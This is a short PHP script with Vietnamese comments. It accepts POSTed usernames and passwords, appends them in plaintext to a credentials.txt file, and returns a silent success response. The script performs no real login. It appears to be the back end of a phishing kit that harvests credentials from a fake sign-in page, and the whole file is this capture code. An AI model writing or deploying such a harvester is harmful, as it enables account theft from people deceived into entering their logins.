<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Lưu tài khoản vào file credentials.txt
    $file = 'credentials.txt';
    $data = "Tài Khoản: $username, Mật Khẩu: $password\n";
    
    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);

    // Trả về trạng thái thành công
    http_response_code(200);
    exit();
} else {
    http_response_code(400); // Trả về lỗi nếu không phải yêu cầu POST
    echo "Yêu cầu không hợp lệ.";
}
?>
